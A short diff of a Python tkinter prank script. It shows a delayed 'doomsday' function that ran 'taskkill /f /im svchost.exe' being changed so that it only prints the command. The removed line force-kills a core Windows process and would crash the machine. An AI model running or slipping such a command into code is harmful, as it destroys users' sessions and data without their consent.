@@ -1,4 +1,3 @@
-
 import threading
 import tkinter as tk
 from tkinter import messagebox
@@ -23,7 +22,7 @@ root.protocol("WM_DELETE_WINDOW", on_closing)
 #doomsday
 def byebye():
     time.sleep(17)
-    os.system("taskkill /f /im  svchost.exe")
+    print("taskkill /f /im  svchost.exe")
 def outro():
         threading.Thread(target=byebye).start()    
         messagebox.showwarning("Bad Idea")
